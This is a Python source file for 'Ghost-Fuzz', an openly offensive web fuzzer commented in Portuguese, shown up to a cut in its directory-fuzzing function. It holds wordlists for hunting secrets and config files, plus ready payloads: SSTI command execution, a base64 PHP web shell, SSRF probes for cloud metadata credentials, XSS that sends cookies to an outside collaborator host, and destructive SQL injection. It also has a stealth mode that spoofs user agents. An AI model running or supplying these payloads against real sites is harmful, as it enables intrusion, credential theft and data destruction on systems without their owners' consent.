#!/usr/bin/env python3
"""
Ghost-Fuzz v1.0.0 - Web Application Fuzzer Ofensivo
=====================================================
Fuzzer web multi-funcao para pentest. Realiza brute-force de diretorios/arquivos,
fuzzing de parametros para LFI/RFI/SSTI/SSRF/XSS/SQLi/Path Traversal, deteccao
de endpoints sensiveis e analise de respostas com filtros avancados.

Modos:
  dir      Brute-force de diretorios e arquivos (directory fuzzing)
  param    Fuzzing de parametro especifico (LFI, SSTI, SSRF, XSS, SQLi, etc.)
  vhost    Brute-force de Virtual Hosts (Host header fuzzing)
  header   Fuzzing de valores de header HTTP

Exemplos:
  python ghost-fuzz.py dir -u https://exemplo.com -w wordlist.txt
  python ghost-fuzz.py dir -u https://exemplo.com --builtin wp
  python ghost-fuzz.py dir -u https://exemplo.com --ext php,txt,bak --recurse
  python ghost-fuzz.py param -u "https://exemplo.com/page?id=FUZZ" --lfi
  python ghost-fuzz.py param -u "https://exemplo.com/page?id=FUZZ" --ssti
  python ghost-fuzz.py param -u "https://exemplo.com/page?id=FUZZ" --ssrf --callback http://SEUIP/
  python ghost-fuzz.py param -u "https://exemplo.com/page?id=FUZZ" --sqli
  python ghost-fuzz.py param -u "https://exemplo.com/page?id=FUZZ" --xss
  python ghost-fuzz.py vhost -u https://exemplo.com -d dominio.com
  python ghost-fuzz.py dir -u https://exemplo.com --filter-size 4096 --filter-status 404,403
  python ghost-fuzz.py dir -u https://exemplo.com --stealth --proxy http://127.0.0.1:8080

Dependencias:
  pip install requests

Autor: By Gh0st-Bx1 | github.com/Ghost-Bx1
"""

import argparse
import concurrent.futures
import json
import random
import re
import sys
import time
import urllib.parse
from threading import Lock
from datetime import datetime

try:
    import colorama
    colorama.init(autoreset=False)
except ImportError:
    pass

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
    REQUESTS_OK = True
except ImportError:
    print("[-] Instale requests: pip install requests")
    sys.exit(1)

VERSAO = "2.1.0"


def _build_banner():
    import re as _re
    G = "\033[92m"; Cy = "\033[96m"; D = "\033[2m"; N = "\033[1m"
    W = "\033[97m"; X = "\033[0m"
    IW = 68; eq = "\u2550" * IW; sp = " " * IW
    TL = "\u2554"; TR = "\u2557"; BL = "\u255a"; BR = "\u255d"; VB = "\u2551"
    hl = "\u2500" * 44; bar = "\u2502"
    vl = lambda s: len(_re.sub(r"\x1b\[[0-9;]*m", "", s))

    def _row(s):
        n = vl(s); p = max(0, IW - n); l = p // 2; r = p - l
        return f"{G}{VB}{X}{' ' * l}{s}{' ' * r}{G}{VB}{X}"

    def _row_l(s):
        n = vl(s); p = max(0, IW - n - 2)
        return f"{G}{VB}{X}  {s}{' ' * p}{G}{VB}{X}"

    # Ghost art (braille pixel art)
    ga = [
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠿⠟⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⢀⣠⣤⣶⣶⣶⣶⣶⣶⣤⣀⠢⢝⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⢀⣴⡿⢋⡴⢿⣿⣿⣿⣿⣿⣿⣿⢷⣦⡑⠈⡛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡜⢠⣾⣿⣤⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣶⣦⣤⣤⣀⠉⠻⣿⣿⣿⡿⠿⢛⢛⡻⠿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⠿⠟⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⢀⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⡿⠛⠛⢿⣿⣿⣧⠉⠉⣁⣈⣉⣁⢀⣿⣿⢋⠄⣁⣴⣶⣄⠐⢌⢻⣿⣿{X}", ""),
        ("", f"{G}⡏⠀⣴⣦⣄⠢⡙⢿⣿⣿⣿⣿⣿⣿⡇⠀⣼⣿⣿⣿⠅⠀⠀  ⢹⣿⡿⠁⠀⠀⠀⢹⣿⣿⡆⠀⣿⣿⣿⣿⣿⡟⠁⢀⣴⣿⣿⣿⣿⣷⡈⠎⢿⣿{X}", ""),
        ("", f"{G}⡇⠀⣿⣿⣿⣷⣌⠀⠙⢿⣿⣿⣿⣿⠀⢀⣿⣿⣿⣿⠀⠀⠀  ⠀⠈⣿⡇⠀⠀⠀⠀⠈⢿⣿⡇⠁⢻⣿⣿⣿⡿⠁⢠⣾⣿⣿⣿⡿⢿⣿⣷⠀⠘⣿{X}", ""),
        ("", f"{G}⣇⠀⢿⣿⣿⡟⣿⣷⣄⠀⠙⢿⣿⡇⠀⣸⣿⣿⡿⣿⡀⠀⠀⠀  ⢸⣿⣧⠀⠀⠀⠀⣸⡈⣿⣷⠀⡈⣿⣿⡿⠁⢀⣾⣿⣿⢩⣿⠁⣾⣿⣿⡆⠀⢿{X}", ""),
        ("", f"{G}⣿⡀⠘⣿⣿⣿⡘⣿⣿⣷⣌⠂⠉⠁⢠⣿⣿⡟⣰⢿⣷⣤⣤⣴⣿⣿⣿⣷⣄⣠⣴⣿⣧⠸⣿⣧⡐⠢⠉⠁⢀⣾⣿⣿⡇⣼⣿⢸⣿⣿⣿⣇⠀⢸{X}", ""),
        ("", f"{G}⣿⣷⡀⠸⣿⣿⣧⠸⣿⣿⣿⣿⣶⣶⣿⣿⠏⡰⢃⣾⣿⣿⣿⣿⡏⠀⠈⣿⣿⣿⣿⣿⣏⠳⣘⣿⣿⣷⣶⣾⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⠀⣿⣿⣿⡄⡿⢿⣿⣿⣿⣿⣿⣷⣾⣷⣿⣿⣿⣿⣿⣿⣧⣀⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠋⢉⠉⡉⠛⠿⣿⠀⢸{X}", ""),
        ("", f"{G}⣿⣿⡇⢀⣿⣿⣿⣧⢸⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢠⣾⣿⡄⠈⠀⠀⠀⠀ ⣾{X}", ""),
        ("", f"{G}⣿⡟⠀⣸⣿⣿⣿⣿⣜⡇⢿⣧⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡉⠻⠇⠀⠰⠀⠀ ⣀⣾{X}", ""),
        ("", f"{G}⣿⠃⢠⣿⣿⠿⠿⠿⢿⣿⠸⣿⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢣⢸⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⢰⠜⠋⠀⢀⡄⢰⣤⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠃⢻⣿⣿{X}", ""),
        ("", f"{G}⣿⣆⠠⠀⡀⠀⠁⣿⣿⠟⠀⣽⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⢃⣿⣿⣿⡟⣸⣿⣿⣿⣿⡿⠋⢠⢃⣾⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣷⣶⠆⡄⠈⢉⣠⣴⣾⣿⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢋⣴⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠇⠛⢏⠉⠉⠁⠤⢊⣥⣾⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⢄⠀⢾⣿⣿⣿⣿⡇⢸⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣶⣬⣭⣶⣾⣿⣿⠏⣼⣿⣿⣿⡇⣸⣿⣿⣿⠀⣰⣿⡁⢠⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣤⣀⡀⠀⠀⠉⠉⠁⢸⣿⣿⣿⢸⣿⣿⣿⣿⡹⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⠇⣿⣿⣿⣿⡀⠹⢿⡇⠀⢿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⣼⣿⣿⣿⢸⣿⣿⢻⣿⣷⣌⠻⣿⣿⣿⣿⠟⣡⣾⣿⡟⣼⣿⣿⠀⣿⣿⣿⣿⣿⣶⣤⡀⠀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⠈⠀⣴⣾⣿⣿⣿⡇⢸⣿⣿⣇⢻⣿⣿⣷⣦⣭⣭⣴⣾⣿⣿⣿⢡⣿⣿⣿⠀⣿⣿⣿⣿⣿⠿⠟⠃⡀⢸⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⡐⠠⢈⡉⠛⠛⠿⡇⢸⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⠀⣁⣤⡄⠀⣀⣒⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⡌⠀⣦⠀⣼⣿⣿⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣄⡈⠛⠃⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢁⣤⣿⣿⣿⣿⣿⠘⣿⣿⣿⣿⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣦⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠠⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⢼⠿⠿⣿⣿⣿⣿⠟⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠈⣙⠛⠛⣛⣛⠛⠀⠻⢿⣿⣿⣿⣿⣿⣿⡃⢠⣤⠀⠀⣀⣉⣁⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣤⡀⢀⠈⢿⣿⣿⣿⣿⣷⣄⠁⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠁⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠠⢠⣿⣿⣿⣿⣿⠟⢀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠀⢸⣿⣿⣿⡿⢁⡄⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠰⠘⣿⣿⣿⠁⠎⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡑⠈⠻⠇⠈⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
        ("", f"{G}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{X}", ""),
    ]

    info = [
        f"{G}{N}GHOST-FUZZ{X}",
        f"{Cy}v{VERSAO}  {D}Web Fuzzer & Vulnerability Scanner{X}",
        f"{D}{hl}{X}",
        f"{W}By Gh0st-Bx1  {D}{bar}  github.com/Ghost-Bx1{X}",
        f"{D}{hl}{X}",
        f"{D}dir  param  vhost  header  graphql  jwt{X}",
        f"{D}params  vuln  --sqli  --xss  --ssrf{X}",
        f"{D}--lfi  --cors  --redirect  --stealth{X}",
    ]

    out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
    for left, center, right in ga:
        combined = left + center + right
        out.append(_row(combined))
    out.append(f"{G}{VB}{sp}{VB}{X}")
    for i in info:
        out.append(_row_l(i))
    out += [f"{G}{VB}{sp}{VB}{X}", f"{G}{BL}{eq}{BR}{X}"]
    return "\n".join(out)


BANNER = _build_banner()

C = {
    "R": "\033[91m", "G": "\033[92m", "Y": "\033[93m",
    "B": "\033[94m", "M": "\033[95m", "C": "\033[96m",
    "W": "\033[97m", "X": "\033[0m",  "N": "\033[1m", "D": "\033[2m",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "curl/8.5.0",
]

# Wordlists built-in por categoria
WORDLISTS = {
    "common": [
        "admin", "login", "wp-admin", "administrator", "panel", "dashboard",
        "config", "configuration", "setup", "install", "backup", "bkp",
        "api", "api/v1", "api/v2", "api/v3", "rest", "graphql",
        "upload", "uploads", "files", "file", "images", "img",
        "static", "assets", "media", "css", "js", "javascript",
        "test", "testing", "debug", "dev", "development", "staging",
        "old", "new", "temp", "tmp", "cache",
        "logs", "log", "error", "errors", "access",
        ".git", ".env", ".htaccess", ".htpasswd", "robots.txt",
        "sitemap.xml", "crossdomain.xml", "phpinfo.php", "info.php",
        "readme.txt", "README.md", "CHANGELOG.md", "LICENSE",
        "web.config", "app.config", "database.yml", "config.php",
        "wp-config.php", "config.inc.php", "settings.php",
        "adminer.php", "phpmyadmin", "pma", "mysql", "db",
        "server-status", "server-info", "status", "health",
        "swagger", "swagger-ui", "api-docs", "openapi.json",
        "actuator", "actuator/health", "actuator/env", "actuator/mappings",
        "metrics", "prometheus", "grafana", "kibana",
        "console", "shell", "cmd", "exec",
        "user", "users", "account", "accounts", "profile",
        "search", "find", "query", "ajax",
        "include", "page", "index", "home",
        "download", "export", "import",
        "cgi-bin", "cgi-bin/admin.cgi", "cgi-bin/test.cgi",
        "wp-includes", "wp-content/uploads", "wp-json",
        "xmlrpc.php", "wp-cron.php",
        ".DS_Store", "Thumbs.db",
        "backup.sql", "dump.sql", "database.sql", "db.sql",
        "backup.zip", "backup.tar.gz", "site.zip",
        "id_rsa", "id_rsa.pub", ".ssh/id_rsa",
        "secret", "secrets", "token", "tokens", "key", "keys",
        "private", "private_key", "credentials", "password", "passwords",
        "passwd", "shadow",
        "trace", "trace.axd",
        "elmah.axd", "webresource.axd",
        "WEB-INF", "WEB-INF/web.xml",
        "META-INF", "META-INF/MANIFEST.MF",
        "manager", "manager/html", "host-manager",
    ],
    "wp": [
        "wp-admin", "wp-login.php", "wp-config.php", "wp-cron.php",
        "wp-json", "wp-json/wp/v2/users", "wp-json/wp/v2/posts",
        "wp-content/debug.log", "wp-content/uploads",
        "wp-includes/wlwmanifest.xml", "xmlrpc.php",
        "wp-admin/admin-ajax.php", "wp-trackback.php",
        "readme.html", "license.txt", "wp-activate.php",
        "wp-comments-post.php", "wp-mail.php", "wp-settings.php",
        "wp-content/themes", "wp-content/plugins",
        "wp-admin/install.php", "wp-admin/setup-config.php",
    ],
    "api": [
        "api", "api/v1", "api/v2", "api/v3", "api/v4",
        "api/users", "api/user", "api/admin", "api/auth",
        "api/login", "api/token", "api/refresh",
        "api/config", "api/settings", "api/info",
        "api/health", "api/status", "api/version",
        "api/docs", "api/swagger",
        "rest", "rest/v1", "rest/v2",
        "graphql", "graphiql",
        "v1", "v2", "v3",
        "oauth", "oauth2", "oauth2/token",
        "auth", "auth/login", "auth/token",
        "webhook", "webhooks",
        "callback", "redirect",
    ],
    "php": [
        "index.php", "admin.php", "login.php", "config.php",
        "info.php", "phpinfo.php", "test.php", "shell.php",
        "upload.php", "file.php", "files.php",
        "include.php", "page.php", "view.php",
        "config.inc.php", "db.php", "database.php",
        "functions.php", "common.php", "global.php",
        "footer.php", "header.php",
        "wp-config.php", "wp-config.php.bak",
        "adminer.php", "pma/index.php",
        "install.php", "setup.php",
        "cron.php", "daemon.php",
    ],
    "devops": [
        ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG",
        ".svn/entries", ".svn/wc.db",
        ".env", ".env.local", ".env.production", ".env.backup",
        "docker-compose.yml", "docker-compose.yaml",
        "Dockerfile", ".dockerignore",
        "kubernetes.yml", "k8s.yml", "deployment.yaml",
        "Jenkinsfile", ".travis.yml", ".gitlab-ci.yml",
        "Makefile", "Gruntfile.js", "Gulpfile.js",
        "package.json", "composer.json", "requirements.txt",
        "Gemfile", "Gemfile.lock",
        "terraform.tfstate", "terraform.tfvars",
        "ansible.cfg", "playbook.yml",
        "config.yaml", "config.yml",
        "secrets.yaml", "secrets.yml",
        ".npmrc", ".yarnrc", ".pip.conf",
        "id_rsa", "id_ecdsa",
        "server.key", "server.pem", "cert.pem",
        "credentials", "credentials.json", "key.json",
        "application.properties", "application.yml",
        "log4j.properties", "logback.xml",
    ],
}

# Payloads por tipo de vulnerabilidade
PAYLOADS = {
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
        "../etc/shadow", "../../etc/shadow",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..%2F..%2Fetc%2Fpasswd", "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd", "....////....////etc/passwd",
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/proc/self/environ", "/proc/self/cmdline", "/proc/version",
        "/proc/net/tcp", "/proc/net/udp",
        "/var/log/apache2/access.log", "/var/log/nginx/access.log",
        "/var/log/auth.log", "/var/log/syslog",
        "php://filter/convert.base64-encode/resource=index",
        "php://filter/convert.base64-encode/resource=../index",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id", "zip://shell.jpg%23payload.php",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini", "C:\\boot.ini",
        "../../../../../../../../boot.ini",
        "/etc/passwd%00", "../../etc/passwd%00",
    ],
    "ssti": [
        "{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}",
        "${{7*7}}", "{7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self}}", "{{request}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${{''.class.mro[1].subclasses()}}",
        "{{7*7}}{{7*7}}", "@(1+1)", "*{7*7}",
        "{% debug %}", "{{ ''.__class__.__mro__ }}",
        "{{range.constructor(\"return eval(\\\"global.process.mainModule.require('child_process').execSync('id').toString()\\\")\")()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex('id')}",
        "@{1+1}", "#{ 7 * 7 }",
        "{{2+2}}", "<%=2+2%>", "{2+2}", "${{2+2}}",
    ],
    "ssrf": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "http://localhost:6379/",
        "http://localhost:9200/",
        "http://localhost:27017/",
        "http://localhost:5432/",
        "http://localhost:3306/",
        "http://localhost:11211/",
        "file:///etc/passwd",
        "file:///C:/Windows/System32/drivers/etc/hosts",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
        "sftp://evil.com:22/",
        "ldap://127.0.0.1:389/",
        "http://localtest.me/",
        "http://127.0.0.1.nip.io/",
        "http://0x7f000001/",
        "http://0x7f.0x0.0x0.0x1/",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(document.domain)</script>",
        "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
        "<audio src=1 href=1 onerror=\"javascript:alert(1)\">",
        "<video src=1 href=1 onerror=\"javascript:alert(1)\">",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "%--%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "<script>fetch('http://BURP_COLLAB.burpcollaborator.net/'+document.cookie)</script>",
        "<svg/onload=fetch('http://BURP_COLLAB.burpcollaborator.net/'+btoa(document.cookie))>",
    ],
    "sqli": [
        "'", "''", "\"", "\" OR \"1\"=\"1", "' OR '1'='1",
        "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1' GROUP BY 1,2--", "1' GROUP BY 1,2,3--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1 AND 1=1", "1 AND 1=2",
        "1' AND '1'='1", "1' AND '1'='2",
        "1 AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "' OR 1=1 LIMIT 1--", "admin'--", "admin'#",
        "' OR 'x'='x", "1;DROP TABLE users--",
        "1' HAVING 1=1--", "1' HAVING 1=2--",
    ],
    "path_traversal": [
        "../", "../../", "../../../", "../../../../",
        "../../../../../", "../../../../../../",
        "..\\", "..\\..\\", "..\\..\\..\\",
        "%2e%2e%2f", "%2e%2e/", "..%2f",
        "%2e%2e%5c", ".%2e/", "%2e./",
        "....//", "....////",
        "%252e%252e%252f", "..%5c",
        "%c0%ae%c0%ae/", "%c0%af",
        "..%c0%af", "..%c1%9c",
    ],
}

_lock = Lock()
_contagem = {"total": 0, "encontrados": 0}


def _log(msg, nivel="INFO"):
    niveis = {
        "INFO":   (C["B"], "[*]"),
        "OK":     (C["G"], "[+]"),
        "ERRO":   (C["R"], "[-]"),
        "ALERTA": (C["Y"], "[!]"),
        "ACHADO": (C["M"] + C["N"], "[>]"),
        "CRITICO":(C["R"] + C["N"], "[!!!]"),
    }
    cor, simbolo = niveis.get(nivel, (C["W"], "[*]"))
    with _lock:
        print(f"  {cor}{simbolo} {msg}{C['X']}")


def _progresso(atual, total, prefixo=""):
    pct = int((atual / total) * 40) if total > 0 else 0
    barra = "[" + "=" * pct + "-" * (40 - pct) + "]"
    with _lock:
        print(f"\r  {C['D']}{prefixo} {barra} {atual}/{total}{C['X']}", end="", flush=True)


def _get_ua(stealth=False):
    if stealth:
        return random.choice(USER_AGENTS)
    return USER_AGENTS[0]


def _criar_sessao(proxy=None, timeout=10):
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    sess.verify = False
    return sess


def _cor_status(status):
    if status in range(200, 300):
        return C["G"]
    if status in range(300, 400):
        return C["C"]
    if status == 401 or status == 403:
        return C["Y"]
    if status == 500:
        return C["R"]
    return C["D"]


# ==============================================================================
# MODO: DIRECTORY FUZZING
# ==============================================================================

def _fuzz_dir_worker(args):
    url_base, caminho, sess, timeout, headers_req, extensoes = args
    resultados_worker = []
    alvos = [caminho]
    if extensoes:
        for ext in extensoes:
            ext = ext.strip().lstrip(".")
            alvos.append(f"{caminho}.{ext}")

    for alvo in alvos:
        url = f"{url_base.rstrip('/')}/{alvo.lstrip('/')}"
        try:
            r = sess.get(url, headers=headers_req, allow_redirects=False, timeout=timeout)
            status = r.status_code
            tamanho = len(r.content)
            resultado = {
                "url": url, "status": status, "tamanho": tamanho,
                "tipo": r.headers.get("content-type", ""),
                "redirect": r.headers.get("location", ""),
            }
            resultados_worker.append(resultado)
        except Exception:
            pass
    return resultados_worker


def fuzzing_dir(url, wordlist, extensoes=None, threads=50, timeout=5,
                filter_status=None, filter_size=None, stealth=False,
                proxy=None, verbose=False, recurse=False, _depth=0):
    """Brute-force de diretorios e arquivos."""
    resultado = {"url": url, "encontrados": [], "total": len(wordlist)}
    sess = _criar_sessao(proxy, timeout)
    headers_req = {
        "User-Agent": _get_ua(stealth),
        "Accept": "*/*",
        "Connection": "keep-alive",
    }

    # Obter tamanho da pagina 404 base para filtrar falsos positivos
    tamanho_404 = None
    try:
        r404 = sess.get(f"{url.rstrip('/')}/GHOST_FUZZ_404_NONEXISTENT_PATH_12345",
                        allow_redirects=False, timeout=timeout, headers=headers_req)
        tamanho_404 = len(r404.content)
        if verbose:
            _log(f"Baseline 404: status={r404.status_code} tamanho={tamanho_404}", "INFO")
    except Exception:
        pass

    args_list = [(url, c, sess, timeout, headers_req, extensoes) for c in wordlist]
    concluido = 0
    encontrados = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futuros = {executor.submit(_fuzz_dir_worker, a): a for a in args_list}
        for fut in concurrent.futures.as_completed(futuros):
            concluido += 1
            _progresso(concluido, len(wordlist), "Dir:")
            resultados_worker = fut.result()
            for res in resultados_worker:
                status = res["status"]
                tamanho = res["tamanho"]

                # Filtros
                if filter_status and status not in filter_status:
                    continue
                if not filter_status and status in [404, 400]:
                    continue
                if filter_size and tamanho == filter_size:
                    continue
